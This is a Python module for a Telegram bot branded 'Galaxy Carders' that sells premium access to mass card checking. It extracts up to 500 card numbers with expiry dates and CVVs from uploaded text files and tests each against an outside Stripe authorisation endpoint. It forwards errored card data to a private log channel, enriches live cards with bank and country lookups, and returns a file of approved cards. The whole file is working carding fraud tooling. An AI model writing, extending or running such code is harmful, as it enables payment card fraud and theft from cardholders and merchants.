
import os
import re
import time
import threading
import requests
import json
from telebot import types

LOG_CHANNEL_ID = -1002711857436
CHANNEL_URL = "https://t.me/Galaxy_Carders"
OWNER_ID = 7578581395
PREMIUM_FILE = "id.txt"
API_BASE = "https://phpstack-1493278-5699585.cloudwaysapps.com/chk.php?cc="
CARD_REGEX = re.compile(r"(\d{12,19})\D(\d{1,2})\D(\d{2,4})\D(\d{3,4})")
MAX_CARDS = 500
ERROR_THRESHOLD = 5

stop_flags = {}

# ─── Premium Checker ───
def is_premium(uid: int) -> bool:
    if not os.path.isfile(PREMIUM_FILE): return False
    with open(PREMIUM_FILE, 'r') as f:
        for line in f:
            parts = line.strip().split(":")
            if len(parts) >= 2 and int(parts[0]) == uid:
                return True
    return False

# ─── Extract CCs ───
def extract_cards(text):
    return ["|".join(m.groups()) for m in CARD_REGEX.finditer(text)]

# ─── BIN Lookup ───
def get_bin_info(bin_number):
    bin6 = bin_number[:6]
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin6}", timeout=5)
        if r.ok:
            j = r.json()
            brand = j.get("scheme", "N/A").upper()
            ctype = j.get("type", "N/A").upper()
            level = j.get("brand", "N/A").upper()
            bank = j.get("bank", {}).get("name", "N/A").upper()
            country = j.get("country", {}).get("name", "N/A").upper()
            emoji = j.get("country", {}).get("emoji", "")
            return brand, ctype, level, bank, f"{country} - {emoji}"
    except:
        pass

    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5)
        if r.ok:
            j = r.json()
            brand = j.get("brand", "N/A").upper()
            ctype = j.get("type", "N/A").upper()
            level = j.get("level", "N/A").upper()
            bank = j.get("bank", "N/A").upper()
            country = j.get("country_name", "N/A") + " - " + j.get("country_flag", "")
            return brand, ctype, level, bank, country
    except:
        pass
    return "N/A", "N/A", "N/A", "N/A", "N/A"

# ─── API Call ───
def api_check(card):
    try:
        res = requests.get(API_BASE + card, timeout=20)
        try:
            j = res.json()
        except:
            return "Declined", res.text.strip()
        if isinstance(j, str):
            try: j = json.loads(j)
            except: return "Declined", j
        if isinstance(j, dict) and j.get("success"):
            return "Approved", j.get("data", {}).get("status", "Succeeded")
        return "Declined", j.get("data", {}).get("error", {}).get("message", "Your card was declined.")
    except Exception as e:
        return "Error", str(e)

# ─── Footer ───
footer = "\n\n<b>🔗 Powered by:</b> <a href='https://t.me/Galaxy_Carders'>Galaxy Carders</a>"

# ─── Register /stxt ───
def register_stxt_handler(bot):

    @bot.message_handler(func=lambda m: bool(re.search(r"(?:^|[!./_=:-])stxt\b", m.text or "", re.IGNORECASE)))
    def stxt_handler(msg):
        if not is_premium(msg.from_user.id):
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("💎 Buy Premium Access", url=CHANNEL_URL))
            return bot.reply_to(msg, "❌ Only premium users can use this command.", reply_markup=markup)

        if stop_flags.get(msg.from_user.id) == "running":
            return bot.reply_to(msg, "⛔ You already have a running card check. Please stop or wait to finish.")

        if not msg.reply_to_message or not msg.reply_to_message.document:
            return bot.reply_to(msg, "❌ Reply to a .txt file with your cards.")

        file_info = bot.get_file(msg.reply_to_message.document.file_id)
        if not file_info.file_path.endswith(".txt"):
            return bot.reply_to(msg, "❌ Invalid file format. Only .txt allowed.")

        downloaded_file = bot.download_file(file_info.file_path)
        content = downloaded_file.decode("utf-8", errors="ignore")
        cards = extract_cards(content)
        if not cards:
            return bot.reply_to(msg, "❌ No valid cards found.")
        if len(cards) > MAX_CARDS:
            return bot.reply_to(msg, f"⚠️ Max {MAX_CARDS} cards allowed.")

        stop_flags[msg.from_user.id] = "running"

        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛑 Stop", callback_data=f"stop_stxt_{msg.from_user.id}"))

        sent_msg = bot.reply_to(
            msg,
            f"<b><i>⚡ MASS TXT STRIPE AUTH /stxt</i></b>\n<i>Initializing scan...</i>{footer}",
            parse_mode="HTML",
            reply_markup=markup
        )

        def worker():
            approved = []
            total = len(cards)
            dead = 0
            error_map = {}

            for idx, cc in enumerate(cards, start=1):
                if stop_flags.get(msg.from_user.id) != "running":
                    break

                status, reason = api_check(cc)

                if status == "Approved":
                    b, t, l, bank, country = get_bin_info(cc.split("|")[0])
                    approved.append(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n\n𝗖𝗮𝗿𝗱- {cc} \n𝐆𝐚𝐭𝐞𝐰𝐚𝐲- STRIPE AUTH\n𝐑𝐞𝐬𝐩𝗈𝗇𝐬𝗲- {reason}\n\n𝗜𝗻𝗳𝗼- {b} - {t} - {l}\n𝐁𝐚𝐧𝐤- {bank} \n𝐂𝐨𝐮𝐧𝐭𝐫𝐲- {country}\n")
                elif status == "Declined":
                    dead += 1
                elif status == "Error":
                    error_map[reason] = error_map.get(reason, 0) + 1
                    if error_map[reason] > ERROR_THRESHOLD:
                        bot.edit_message_text(
                            chat_id=sent_msg.chat.id,
                            message_id=sent_msg.message_id,
                            text=f"<b><i>❌ Too many repeated errors:</i></b> <code>{reason}</code>\n<b><i>⚠️ Checking Stopped Automatically</i></b>{footer}",
                            parse_mode="HTML"
                        )
                        stop_flags[msg.from_user.id] = False
                        return
                    try:
                        bot.send_message(LOG_CHANNEL_ID, f"⚠️ <code>{cc}</code>\n<pre>{reason}</pre>", parse_mode="HTML")
                    except: pass
                    continue

                now_card = f"<b><i>💳 Card ➜</i></b> <code>{cc}</code>\n<b><i>📬 Result ➜</i></b> <i>{reason}</i>"
                progress = f"<b><i>🔁 Progress ➜</i></b> <code>{idx}/{total}</code> | ✅ <code>{len(approved)}</code> | ❌ <code>{dead}</code>"
                animated = f"<b><i>⚡ MASS TXT STRIPE AUTH /stxt</i></b>\n\n{now_card}\n\n{progress}{footer}"
                try:
                    bot.edit_message_text(animated, sent_msg.chat.id, sent_msg.message_id, parse_mode="HTML", reply_markup=markup)
                except:
                    pass

            if approved:
                filename = "GalaxyCheckers_approved.txt"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write("👑 BOT BY: @Galaxy_Carders\n\n")
                    f.writelines(f"{line}\n\n" for line in approved)
                with open(filename, "rb") as doc:
                    bot.send_document(msg.chat.id, doc, reply_to_message_id=msg.message_id)
                os.remove(filename)

            summary = f"<b><i>✅ Checking Finished</i></b>\n<b><i>📊 Total:</i></b> <code>{total}</code> | ✅ <code>{len(approved)}</code> | ❌ <code>{dead}</code>{footer}"
            bot.edit_message_text(summary, sent_msg.chat.id, sent_msg.message_id, parse_mode="HTML")
            stop_flags[msg.from_user.id] = False

        threading.Thread(target=worker, daemon=True).start()

    @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_stxt_"))
    def stop_stxt(call):
        uid = int(call.data.split("_")[-1])
        if call.from_user.id != uid:
            return bot.answer_callback_query(call.id, "❌ Not your session.", show_alert=True)
        stop_flags[uid] = False
        bot.edit_message_text(f"<b><i>✅ Card checking stopped by user.</i></b>{footer}", call.message.chat.id, call.message.message_id, parse_mode="HTML")
